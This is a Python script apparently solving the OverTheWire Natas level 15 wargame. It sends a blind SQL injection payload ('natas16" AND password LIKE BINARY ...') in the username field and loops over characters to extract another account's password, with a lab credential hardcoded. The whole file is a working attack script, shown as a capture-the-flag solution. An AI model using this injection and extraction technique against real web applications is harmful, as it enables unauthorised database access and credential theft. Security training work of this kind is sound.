import requests
import string

characters = string.ascii_uppercase + string.ascii_lowercase + string.digits

username = 'natas15'
password = 'TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()

# response = session.get(url, auth=(username, password))

seen_password = list()
while True:
    for ch in characters:
        print("trying with password", "".join(seen_password) + ch)
        response = session.post(
            url,
            data={
                "username": 'natas16" AND password LIKE BINARY "' +"".join(seen_password) + ch + '%" #'
            }, auth=(username, password)
        )
        
        content = response.text
        
        if "This user exists." in content:
            seen_password.append(ch)
            break
        
    print("Current password:", "".join(seen_password))

    # Add a condition to exit the loop when the password length is reached
    if len(seen_password) == len(password):
        print("Password found:", "".join(seen_password))
        break
